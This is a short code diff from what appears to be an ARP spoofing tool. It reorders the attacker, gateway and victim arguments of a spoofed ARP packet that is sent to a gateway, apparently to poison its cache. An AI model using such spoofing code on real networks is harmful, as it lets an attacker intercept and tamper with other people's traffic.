@@ -22,8 +22,8 @@ class ARP:
             gateway = User(self.spoof_ip)
             gateway.get_mac()
             gateway_packet = ARPPacket(
+                self.attacker,
                 gateway,
-                self.victim,
-                self.attacker
+                self.victim
             )
             gateway_packet.send()
